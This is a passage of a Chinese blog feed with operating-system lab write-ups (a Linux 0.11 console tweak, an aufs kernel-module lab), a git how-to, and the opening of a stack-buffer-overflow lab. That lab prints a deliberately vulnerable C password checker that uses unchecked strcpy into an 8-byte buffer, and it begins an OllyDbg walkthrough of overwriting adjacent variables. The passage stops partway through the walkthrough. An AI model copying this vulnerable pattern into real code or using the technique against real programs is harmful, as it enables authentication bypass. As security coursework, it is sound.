<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> judge;	<span class="comment">//引用代码tty_io.c中的judge变量</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">con_write</span><span class="params">(<span class="keyword">struct</span> tty_struct * tty)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    nr = CHARS(tty-&gt;write_q);</span><br><span class="line">    <span class="keyword">while</span> (nr--) &#123;</span><br><span class="line">        GETCH(tty-&gt;write_q,c);</span><br><span class="line">        <span class="keyword">switch</span>(state) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (x&gt;=video_num_columns) &#123;</span><br><span class="line">                        x -= video_num_columns;</span><br><span class="line">                        pos -= video_size_row;</span><br><span class="line">                        lf();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(judge==<span class="number">1</span>)	</span><br><span class="line">                        <span class="comment">//通过判断judge是否为1判断是否进行中断</span></span><br><span class="line">                        <span class="comment">//从而判断是否全部输出 *</span></span><br><span class="line">                        c=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">                    __asm__(<span class="string">&quot;movb attr,%%ah\n\t&quot;</span></span><br><span class="line">                        <span class="string">&quot;movw %%ax,%1\n\t&quot;</span></span><br><span class="line">                        ::<span class="string">&quot;a&quot;</span> (c),<span class="string">&quot;m&quot;</span> (*(<span class="type">short</span> *)pos)</span><br><span class="line">                        );</span><br><span class="line">                    pos += <span class="number">2</span>;</span><br><span class="line">                    x++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">27</span>)</span><br><span class="line">                    state=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">10</span> || c==<span class="number">11</span> || c==<span class="number">12</span>)</span><br><span class="line">                    lf();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">13</span>)</span><br><span class="line">                    cr();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==ERASE_CHAR(tty))</span><br><span class="line">                    del();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (x) &#123;</span><br><span class="line">                        x--;</span><br><span class="line">                        pos -= <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">9</span>) &#123;</span><br><span class="line">                    c=<span class="number">8</span>-(x&amp;<span class="number">7</span>);</span><br><span class="line">                    x += c;</span><br><span class="line">                    pos += c&lt;&lt;<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (x&gt;video_num_columns) &#123;</span><br><span class="line">                        x -= video_num_columns;</span><br><span class="line">                        pos -= video_size_row;</span><br><span class="line">                        lf();</span><br><span class="line">                    &#125;</span><br><span class="line">                    c=<span class="number">9</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">7</span>)</span><br><span class="line">                    sysbeep();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                state=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (c==<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                    state=<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">                    gotoxy(<span class="number">0</span>,y+<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">                    ri();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">                    lf();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">                    respond(tty);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (x==<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">                    save_cur();</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (x==<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">                    restore_cur();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">for</span>(npar=<span class="number">0</span>;npar&lt;NPAR;npar++)</span><br><span class="line">                    par[npar]=<span class="number">0</span>;</span><br><span class="line">                npar=<span class="number">0</span>;</span><br><span class="line">                state=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">if</span> ((ques=(c==<span class="string">&#x27;?&#x27;</span>)))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span> (c==<span class="string">&#x27;;&#x27;</span> &amp;&amp; npar&lt;NPAR<span class="number">-1</span>) &#123;</span><br><span class="line">                    npar++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; c&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                    par[npar]=<span class="number">10</span>*par[npar]+c-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> state=<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                state=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        gotoxy(par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x,y-par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x,y+par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x+par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(x-par[<span class="number">0</span>],y);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(<span class="number">0</span>,y+par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">0</span>]) par[<span class="number">0</span>]++;</span><br><span class="line">                        gotoxy(<span class="number">0</span>,y-par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        gotoxy(x,par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">1</span>]) par[<span class="number">1</span>]--;</span><br><span class="line">                        gotoxy(par[<span class="number">1</span>],par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;J&#x27;</span>:</span><br><span class="line">                        csi_J(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>:</span><br><span class="line">                        csi_K(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                        csi_L(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                        csi_M(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;P&#x27;</span>:</span><br><span class="line">                        csi_P(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;@&#x27;</span>:</span><br><span class="line">                        csi_at(par[<span class="number">0</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">                        csi_m();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>]) par[<span class="number">0</span>]--;</span><br><span class="line">                        <span class="keyword">if</span> (!par[<span class="number">1</span>]) par[<span class="number">1</span>] = video_num_lines;</span><br><span class="line">                        <span class="keyword">if</span> (par[<span class="number">0</span>] &lt; par[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">                            par[<span class="number">1</span>] &lt;= video_num_lines) &#123;</span><br><span class="line">                            top=par[<span class="number">0</span>];</span><br><span class="line">                            bottom=par[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                        save_cur();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">                        restore_cur();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    set_cursor();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="将更改后的文件重新编译"><a href="#将更改后的文件重新编译" class="headerlink" title="将更改后的文件重新编译"></a>将更改后的文件重新编译</h2><ol>
<li><p>首先输入命令<code>make clean</code>清空编译；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125234719.png"></p>
</li>
<li><p>输入命令<code>make</code>和<code>make start</code>进行编译并运行；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125234858493.png" alt="image-20191125234858493"></p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125235053453.png" alt="image-20191125235053453"></p>
</li>
<li><p>输入命令<code>ls</code>，发现输出正常；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125235327605.png" alt="image-20191125235327605"></p>
</li>
<li><p>按下F12，输出四个进程；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125235516207.png" alt="image-20191125235516207"></p>
</li>
<li><p>继续输入<code>ls</code>，输出全是<code>*</code>；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125235710080.png" alt="image-20191125235710080"></p>
</li>
<li><p>按下F12，输出得全是<code>*</code>；继续输入<code>ls</code>，输出正常。继续测试，按下F12，依次切换<code>*</code>，和正常输出，实验完成。</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191126000059618.png" alt="image-20191126000059618"></p>
</li>
</ol>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>输入输出管理</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核 实验四</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%9B%9B.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>掌握文件系统的工作机理</li>
<li>理解文件系统的主要数据结构</li>
<li>学习较为复杂的Linux下的编程</li>
<li>了解EXT2文件系统的结构</li>
</ol>
<span id="more"></span>

<h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><h2 id="外存管理"><a href="#外存管理" class="headerlink" title="外存管理"></a>外存管理</h2><p>文件系统层次结构如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140351.png"></p>
<h2 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140429.png"></p>
<h2 id="文件系统接口"><a href="#文件系统接口" class="headerlink" title="文件系统接口"></a>文件系统接口</h2><p>命令接口</p>
<p>程序接口</p>
<h2 id="Linux的EXT2文件系统"><a href="#Linux的EXT2文件系统" class="headerlink" title="Linux的EXT2文件系统"></a>Linux的EXT2文件系统</h2><ul>
<li><p>EXT2文件系统结构<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191028140906.png"></p>
</li>
<li><p>数据地址安排</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111002748.png" style="zoom:10%;" /></li>
</ul>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
<li><p>输入命令<code>make</code>编译该文件系统：成功<code>build modules</code>(该实验是在root用户下实现的，不需要输入<code>sudo</code>)<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021201.png"></p>
</li>
<li><p>输入命令<code>insmod aufs.ko</code>安装模块<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021442.png"></p>
</li>
<li><p>使用<code>dmesg</code>命令查看模块是否安装成功<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021630.png"></p>
<p>在使用<code>dmesg</code>命令后，输出了相当多的模块信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111021717.png"></p>
<p>在输出信息的最后，可以发现语句如下，表示模块已经安装成功.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 1861.402049] create inode cache success</span><br><span class="line">[ 1861.402056] register filesystem success</span><br><span class="line">[ 1861.402059] aufs module loaded</span><br></pre></td></tr></table></figure></li>
<li><p>输入命令<code>mount -o loop -t aufs ./image ./dir</code>挂载设备<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111022338.png"></p>
</li>
<li><p>使用命令<code>dmesg</code>再次打印模块输出，可以查看挂载是否成功.</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191111022446.png"></p>
<p>获得了<code>super block</code>的相关信息<code>super block</code>结构是指文件系统在磁盘分区的特殊位置中存储的文件系统参数集，包括：</p>
<ol>
<li><code>magic</code></li>
<li>索引节点块——<code>inode blocks</code></li>
<li>块大小——<code>block size</code></li>
<li>根节点——<code>root inode</code></li>
<li>块中的索引节点数——<code>inodes in block</code></li>
</ol>
</li>
<li><p>卸载模块前必须先卸载已挂载的文件系统，否则会出现以下错误 ：<br><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191111022536623.png" alt="image-20191111022536623"></p>
</li>
<li><p>输入<code>mount</code>指令查看已挂载的设备，找到挂载的文件系统及其挂载点为<code>/root/桌面/filesystem/image</code>和<code>/root/桌面/filesystem/dir</code><br><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191111022608021.png" alt="image-20191111022608021"></p>
</li>
<li><p>卸载系统后，卸载模块。在卸载已挂载的设备时，该设备不能有进程在运行。<br><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191111022828188.png" alt="image-20191111022828188"></p>
</li>
<li><p>再输入<code>dmesg</code>命令显示已卸载。<br><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191111022905569.png" alt="image-20191111022905569"></p>
</li>
</ol>
<h1 id="核心代码分析"><a href="#核心代码分析" class="headerlink" title="核心代码分析"></a>核心代码分析</h1><p>本次实验代码的核心在<code>inode</code>分配函数</p>
<h2 id="aufs-fill-sb函数"><a href="#aufs-fill-sb函数" class="headerlink" title="aufs_fill_sb函数"></a><code>aufs_fill_sb</code>函数</h2><p>在为根目录创建<code>dentry</code>（目录项）之前，应创建根目录的索引节点（索引节点）。索引节点结构可能是文件系统中最重要的一种。每个文件系统对象（文件，文件夹，特殊文件，杂志等）都用<code>inode</code>标识。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">aufs_fill_sb</span><span class="params">(<span class="keyword">struct</span> super_block *sb, <span class="type">void</span> *data, <span class="type">int</span> silent)</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">root</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      sb-&gt;s_magic = AUFS_MAGIC_NUMBER;</span><br><span class="line">      sb-&gt;s_op = &amp;aufs_super_ops;</span><br><span class="line"></span><br><span class="line">      root = new_inode(sb);</span><br><span class="line">      <span class="keyword">if</span> (!root)</span><br><span class="line">      &#123;</span><br><span class="line">           pr_err(<span class="string">&quot;inode allocation failed\n&quot;</span>);</span><br><span class="line">           <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      root-&gt;i_ino = <span class="number">0</span>;</span><br><span class="line">      root-&gt;i_sb = sb;</span><br><span class="line">      root-&gt;i_atime = root-&gt;i_mtime = root-&gt;i_ctime = CURRENT_TIME;</span><br><span class="line">      inode_init_owner(root, <span class="literal">NULL</span>, S_IFDIR);</span><br><span class="line"></span><br><span class="line">      sb-&gt;s_root = d_make_root(root);</span><br><span class="line">      <span class="keyword">if</span> (!sb-&gt;s_root)</span><br><span class="line">      &#123;</span><br><span class="line">          pr_err(<span class="string">&quot;root creation failed\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="aufs-inode-fill函数"><a href="#aufs-inode-fill函数" class="headerlink" title="aufs_inode_fill函数"></a><code>aufs_inode_fill</code>函数</h2><p>负责填充</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">aufs_inode_fill</span><span class="params">(<span class="keyword">struct</span> aufs_inode *ai,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> aufs_disk_inode <span class="type">const</span> *di)</span></span><br><span class="line">&#123;</span><br><span class="line">    ai-&gt;ai_block = be32_to_cpu(di-&gt;di_first);</span><br><span class="line">    ai-&gt;ai_inode.i_mode = be32_to_cpu(di-&gt;di_mode);</span><br><span class="line">    ai-&gt;ai_inode.i_size = be32_to_cpu(di-&gt;di_size);</span><br><span class="line">    ai-&gt;ai_inode.i_blocks = be32_to_cpu(di-&gt;di_blocks);</span><br><span class="line">    ai-&gt;ai_inode.i_ctime.tv_sec = be64_to_cpu(di-&gt;di_ctime);</span><br><span class="line">    ai-&gt;ai_inode.i_mtime.tv_sec = ai-&gt;ai_inode.i_atime.tv_sec =</span><br><span class="line">                ai-&gt;ai_inode.i_ctime.tv_sec;</span><br><span class="line">    ai-&gt;ai_inode.i_mtime.tv_nsec = ai-&gt;ai_inode.i_atime.tv_nsec =</span><br><span class="line">                ai-&gt;ai_inode.i_ctime.tv_nsec = <span class="number">0</span>;</span><br><span class="line">    i_uid_write(&amp;ai-&gt;ai_inode, (<span class="type">uid_t</span>)be32_to_cpu(di-&gt;di_uid));</span><br><span class="line">    i_gid_write(&amp;ai-&gt;ai_inode, (<span class="type">gid_t</span>)be32_to_cpu(di-&gt;di_gid));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>文件系统管理</tag>
      </tags>
  </entry>
  <entry>
    <title>本地代码更新到Github</title>
    <url>/%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%9B%B4%E6%96%B0%E5%88%B0Github.html</url>
    <content><![CDATA[<h1 id="本地代码更新到Github"><a href="#本地代码更新到Github" class="headerlink" title="本地代码更新到Github"></a>本地代码更新到Github</h1><span id="more"></span>

<ol>
<li><p>查看当前的git仓库状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure></li>
<li><p>更新全部</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add *</span><br></pre></td></tr></table></figure></li>
<li><p>进行<code>commit</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;更新说明&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p>拉取当前分支最新代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
<li><p>push到远程master分支上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1.jpg" alt="1"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/2.jpg" alt="2"></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出实验</title>
    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>通过对程序输入的密码的长度、内容等修改用<code>Ollydbg</code>来验证缓冲区溢出的发生；</li>
<li>完成淹没相邻变量改变程序流程实验；</li>
<li>完成淹没返回地址改变程序流程实验。<span id="more"></span></li>
</ol>
<h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buff</span></span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!	</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please input password:       &quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">		</span><br><span class="line">		valid_flag = verify_password(password);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(valid_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在主函数内输入密码<code>password</code></p>
</li>
<li><p>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>1234567</code>是否相等,如果相等则子函数返回0，否则返回非0，在函数返回之前将输入的<code>password</code>拷贝到数组<code>buffer[8]</code>里面</p>
</li>
<li><p>主函数在判断子函数<code>verify_password()</code>返回值：如果是0，则输出<code>Congratulation! You have passed the verification!</code>，结束程序，否则输出<code>incorrect password!</code>，继续输入密码<code>password</code>重复上述过程</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799697555.png" alt="1565799697555"></p>
</li>
</ol>
<h1 id="验证缓冲区溢出"><a href="#验证缓冲区溢出" class="headerlink" title="验证缓冲区溢出"></a>验证缓冲区溢出</h1><p>(通过对程序输入的密码的长度、内容等修改验证缓冲区溢出的发生)</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占四个字节，发生缓冲区溢出只需设置数组<code>buffer[8]</code>的长度大于<code>8</code>字节。是<code>buffer</code>的值覆盖<code>authenticated</code>等的值。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p>
<h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><ol>
<li><p>使用<code>Ollydbg</code>打开<code>overflow_var.exe</code>文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799976558.png" alt="1565799976558"></p>
</li>
<li><p>同时按下<code>Alt</code>和<code>F9</code>执行到用户代码如下图：在地址为<code>00401724</code>处<code>CALL test.00401014</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800007485.png" alt="1565800007485"></p>
</li>
<li><p>找到地址<code>00401014</code>处 <code>JMP test.main</code>，即此处向下为用户代码，通过分析用户代码，发现<code>00401030</code>至<code>0040107F</code>为子函数<code>verify_password()</code>反汇编代码</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800057648.png" alt="1565800057648"></p>
</li>
<li><p>分析反汇编代码，找到源代码<code>strcpy(buffer,password)</code>所在的位置发现在<code>00401064</code>处，设置断点。然后点击运行，输入密码为<code>444</code>程序走到这个语句时会自动停止，接着点击不进入函数的单步调试按钮</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800090252.png" alt="1565800090252"></p>
</li>
<li><p>调试过程中观察右下角栈数据，发现两个地址被赋值为<code>444</code> 其中<code>4</code>的<code>ASCII码</code>为<code>0x34</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800116530.png" alt="1565800116530"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800210253.png" alt="1565800210253"></p>
</li>
